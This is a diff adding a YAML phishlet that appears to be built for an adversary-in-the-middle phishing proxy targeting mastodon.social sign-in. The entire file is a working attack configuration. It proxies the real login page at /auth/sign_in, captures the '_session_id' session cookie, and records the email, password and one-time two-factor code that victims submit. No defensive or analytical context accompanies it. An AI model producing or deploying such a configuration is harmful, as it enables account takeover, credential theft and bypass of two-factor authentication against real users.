@@ -1,0 +1,23 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'mastodon.social', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: 'mastodon.social'
+    keys: ['_session_id']
+    type: cookie
+credentials:
+  username:
+    key: 'user\[email\]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'user\[password\]'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'user\[otp_attempt\]'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'mastodon.social'
+  path: '/auth/sign_in'
